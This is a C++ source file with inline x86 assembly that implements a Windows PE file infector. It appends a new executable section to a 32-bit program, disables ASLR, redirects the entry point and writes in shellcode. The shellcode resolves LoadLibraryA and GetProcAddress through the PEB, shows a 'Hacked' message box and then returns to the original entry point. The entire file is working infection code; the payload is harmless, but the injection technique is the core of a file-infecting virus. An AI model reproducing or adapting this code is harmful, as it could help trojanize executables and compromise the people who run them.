#include <windows.h>
#include <imagehlp.h>
#include <winternl.h>
#include <stdio.h>
#pragma comment(lib, "imagehlp")
 
DWORD align(DWORD size, DWORD align, DWORD addr){
    if (!(size % align))
        return addr + size;
    return addr + (size / align + 1) * align;
}
 
int AddSection(char *filepath, char *sectionName, DWORD sizeOfSection){
    HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE){
        CloseHandle(file);
        return 0;
    }
    DWORD fileSize = GetFileSize(file, NULL);
    if (!fileSize){
        CloseHandle(file);
        //empty file,thus invalid
        return -1;
    }
    //so we know how much buffer to allocate
    BYTE *pByte = new BYTE[fileSize];
    DWORD dw;
    //lets read the entire file,so we can use the PE information
    ReadFile(file, pByte, fileSize, &dw, NULL);
 
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE){
        CloseHandle(file);
        return -1; //invalid PE
    }
    PIMAGE_NT_HEADERS NT = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
    if (NT->FileHeader.Machine != IMAGE_FILE_MACHINE_I386){
        CloseHandle(file);
        return -3;//x64 image
    }
    PIMAGE_SECTION_HEADER SH = IMAGE_FIRST_SECTION(NT);
    WORD sCount = NT->FileHeader.NumberOfSections;
 
    //lets go through all the available sections,to see if what we wanna add,already exists or not
    for (int i = 0; i < sCount; i++){
        PIMAGE_SECTION_HEADER x = SH + i;
        if (!strcmp((char *)x->Name, sectionName)){
            //PE section already exists
            CloseHandle(file);
            return -2;
        }
    }
 
    ZeroMemory(&SH[sCount], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&SH[sCount].Name, sectionName, 8);
    //We use 8 bytes for section name,cause it is the maximum allowed section name size
 
    //lets insert all the required information about our new PE section
    SH[sCount].Misc.VirtualSize = align(sizeOfSection, NT->OptionalHeader.SectionAlignment, 0);
    SH[sCount].VirtualAddress = align(SH[sCount - 1].Misc.VirtualSize, NT->OptionalHeader.SectionAlignment, SH[sCount - 1].VirtualAddress);
    SH[sCount].SizeOfRawData = align(sizeOfSection, NT->OptionalHeader.FileAlignment, 0);
    SH[sCount].PointerToRawData = align(SH[sCount - 1].SizeOfRawData, NT->OptionalHeader.FileAlignment, SH[sCount - 1].PointerToRawData);
    SH[sCount].Characteristics = 0xE00000E0;
 
    /*
    0xE00000E0 = IMAGE_SCN_MEM_WRITE |
                 IMAGE_SCN_CNT_CODE  |
                 IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                 IMAGE_SCN_MEM_EXECUTE |
                 IMAGE_SCN_CNT_INITIALIZED_DATA |
                 IMAGE_SCN_MEM_READ
    */
 
    SetFilePointer(file, SH[sCount].PointerToRawData + SH[sCount].SizeOfRawData, NULL, FILE_BEGIN);
    //end the file right here,on the last section + it's own size
    SetEndOfFile(file);
    //now lets change the size of the image,to correspond to our modifications
    //by adding a new section,the image size is bigger now
    NT->OptionalHeader.SizeOfImage = SH[sCount].VirtualAddress + SH[sCount].Misc.VirtualSize;
    //and we added a new section,so we change the NOS too
    NT->FileHeader.NumberOfSections += 1;
    SetFilePointer(file, 0, NULL, FILE_BEGIN);
    //and finaly,we add all the modifications to the file
    WriteFile(file, pByte, fileSize, &dw, NULL);
    CloseHandle(file);
    return 1;
}
 
bool AddCode(char *filepath){
    HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE){
        CloseHandle(file);
        return false;
    }
    DWORD filesize = GetFileSize(file, NULL);
    BYTE *pByte = new BYTE[filesize];
    DWORD dw;
    ReadFile(file, pByte, filesize, &dw, NULL);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
 
    //VERY IMPORTANT
    //IF ASLR IS ENABLED,THIS WILL NOT WORK !!!
    //Solution: Disable ASLR =))
    nt->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
 
    //since we added a new section,it must be the last section added,cause of the code inside
    //AddSection function,thus we must get to the last section to insert our secret data :)
    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
    PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);
 
    SetFilePointer(file, 0, 0, FILE_BEGIN);
    //lets save the OEP
    DWORD OEP = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
 
    //we change the EP to point to the last section created
    nt->OptionalHeader.AddressOfEntryPoint = last->VirtualAddress;
    WriteFile(file, pByte, filesize, &dw, 0);
 
    //lets obtain the opcodes
    DWORD start(0), end(0);
    __asm{
        mov eax, loc1
        mov[start], eax
        //we jump over the second __asm,so we dont execute it in the infector itself
        jmp over
        loc1:
    }
 
    __asm{
        /*
            The purpose of this part is to read the base address of kernel32.dll
            from PEB,walk it's export table (EAT) and search for functions
        */
        mov eax, fs:[30h]
        mov eax, [eax + 0x0c]; 12
        mov eax, [eax + 0x14]; 20
        mov eax, [eax]
        mov eax, [eax]
        mov eax, [eax + 0x10]; 16
 
        mov   ebx, eax; Take the base address of kernel32
        mov   eax, [ebx + 0x3c]; PE header VMA
        mov   edi, [ebx + eax + 0x78]; Export table relative offset
        add   edi, ebx; Export table VMA
        mov   ecx, [edi + 0x18]; Number of names
 
        mov   edx, [edi + 0x20]; Names table relative offset
        add   edx, ebx; Names table VMA
        // now lets look for a function named LoadLibraryA
 
        LLA :
        dec ecx
            mov esi, [edx + ecx * 4]; Store the relative offset of the name
            add esi, ebx; Set esi to the VMA of the current name
            cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
            je LLALOOP1
        LLALOOP1 :
        cmp dword ptr[esi + 4], 0x7262694c
            ;L(4c)i(69)b(62)r(72)
            je LLALOOP2
        LLALOOP2 :
        cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
            je stop; if its = then jump to stop because we found it
            jmp LLA; Load Libr aryA
        stop :
        mov   edx, [edi + 0x24]; Table of ordinals relative
            add   edx, ebx; Table of ordinals
            mov   cx, [edx + 2 * ecx]; function ordinal
            mov   edx, [edi + 0x1c]; Address table relative offset
            add   edx, ebx; Table address
            mov   eax, [edx + 4 * ecx]; ordinal offset
            add   eax, ebx; Function VMA
            // EAX holds address of LoadLibraryA now
 
 
            sub esp, 11
            mov ebx, esp
            mov byte ptr[ebx], 0x75; u
            mov byte ptr[ebx + 1], 0x73; s
            mov byte ptr[ebx + 2], 0x65; e
            mov byte ptr[ebx + 3], 0x72; r
            mov byte ptr[ebx + 4], 0x33; 3
            mov byte ptr[ebx + 5], 0x32; 2
            mov byte ptr[ebx + 6], 0x2e; .
            mov byte ptr[ebx + 7], 0x64; d
            mov byte ptr[ebx + 8], 0x6c; l
            mov byte ptr[ebx + 9], 0x6c; l
            mov byte ptr[ebx + 10], 0x0
 
            push ebx
 
            //lets call LoadLibraryA with user32.dll as argument
            call eax;
            add esp, 11
            //save the return address of LoadLibraryA for later use in GetProcAddress
            push eax
 
 
            // now we look again for a function named GetProcAddress
            mov eax, fs:[30h]
            mov eax, [eax + 0x0c]; 12
            mov eax, [eax + 0x14]; 20
            mov eax, [eax]
            mov eax, [eax]
            mov eax, [eax + 0x10]; 16
 
            mov   ebx, eax; Take the base address of kernel32
            mov   eax, [ebx + 0x3c]; PE header VMA
            mov   edi, [ebx + eax + 0x78]; Export table relative offset
            add   edi, ebx; Export table VMA
            mov   ecx, [edi + 0x18]; Number of names
 
            mov   edx, [edi + 0x20]; Names table relative offset
            add   edx, ebx; Names table VMA
        GPA :
        dec ecx
            mov esi, [edx + ecx * 4]; Store the relative offset of the name
            add esi, ebx; Set esi to the VMA of the current name
            cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
            je GPALOOP1
        GPALOOP1 :
        cmp dword ptr[esi + 4], 0x41636f72
            // backwards remember : ) r(72)o(6f)c(63)A(41)
            je GPALOOP2
        GPALOOP2 :
        cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
            //no need to continue to look further cause there is no other function starting with GetProcAddre
            je stp; if its = then jump to stop because we found it
            jmp GPA
        stp :
            mov   edx, [edi + 0x24]; Table of ordinals relative
            add   edx, ebx; Table of ordinals
            mov   cx, [edx + 2 * ecx]; function ordinal
            mov   edx, [edi + 0x1c]; Address table relative offset
            add   edx, ebx; Table address
            mov   eax, [edx + 4 * ecx]; ordinal offset
            add   eax, ebx; Function VMA
            // EAX HOLDS THE ADDRESS OF GetProcAddress
            mov esi, eax
 
            sub esp, 12
            mov ebx, esp
            mov byte ptr[ebx], 0x4d //M
            mov byte ptr[ebx + 1], 0x65 //e
            mov byte ptr[ebx + 2], 0x73 //s
            mov byte ptr[ebx + 3], 0x73 //s
            mov byte ptr[ebx + 4], 0x61 //a
            mov byte ptr[ebx + 5], 0x67 //g
            mov byte ptr[ebx + 6], 0x65 //e
            mov byte ptr[ebx + 7], 0x42 //B
            mov byte ptr[ebx + 8], 0x6f //o
            mov byte ptr[ebx + 9], 0x78 //x
            mov byte ptr[ebx + 10], 0x41 //A
            mov byte ptr[ebx + 11], 0x0
 
            /*
                get back the value saved from LoadLibraryA return
                So that the call to GetProcAddress is:
                esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
            */
 
            mov eax, [esp + 12]
            push ebx; MessageBoxA
            push eax; base address of user32.dll retrieved by LoadLibraryA
            call esi; GetProcAddress address :))
            add esp, 12
 
        sub esp, 8
        mov ebx,esp
        mov byte ptr[ebx], 72; H
        mov byte ptr[ebx + 1], 97; a
        mov byte ptr[ebx + 2], 99; c
        mov byte ptr[ebx + 3], 107; k
        mov byte ptr[ebx + 4], 101; e
        mov byte ptr[ebx + 5], 100; d
        mov byte ptr[ebx + 6], 0
 
        push 0
        push 0
        push ebx
        push 0
        call eax
        add esp, 8
 
        mov eax, 0xdeadbeef ;Original Entry point
        jmp eax
    }
 
    __asm{
        over:
        mov eax, loc2
        mov [end],eax
        loc2:
    }
 
    byte mac[1000];
    byte *fb = ((byte *)(start));
    DWORD *invalidEP;
    DWORD i = 0;
 
    while (i < ((end - 11) - start)){
        invalidEP = ((DWORD*)((byte*)start + i));
        if (*invalidEP == 0xdeadbeef){
            /*
                Because the value of OEP is stored in this executable's data section,
                if we have said mov eax,OEP the self read part of the program will fill in
                a invalid address,since we point to something that only exists here,
                not in the infected PE's data section.
                Solution:
                We put a place holder with the fancy value of 0xdeadbeef,so we later alter this address
                inside the self read byte storage to the value of OEP
            */
            DWORD old;
            VirtualProtect((LPVOID)invalidEP, 4, PAGE_EXECUTE_READWRITE, &old);
            *invalidEP = OEP;
        }
        mac[i] = fb[i];
        i++;
    }
    SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
    WriteFile(file, mac, i, &dw, 0);
    CloseHandle(file);
    return true;
}
 
void main(){
    char *file = "C:\\Users\\M\\Desktop\\Athena.exe";
    int res = AddSection(file, ".ATH", 400);
    switch (res){
    case 0:
        printf("Error adding section: File not found or in use!\n");
        break;
    case 1:
        printf("Section added!\n");
        if (AddCode(file))
            printf("Code written!\n");
        else
            printf("Error writting code!\n");
        break;
    case -1:
        printf("Error adding section: Invalid path or PE format!\n");
        break;
    case -2:
        printf("Error adding section: Section already exists!\n");
        break;
    case -3:
        printf("Error: x64 PE detected! This version works only with x86 PE's!\n");
        break;
    }
}
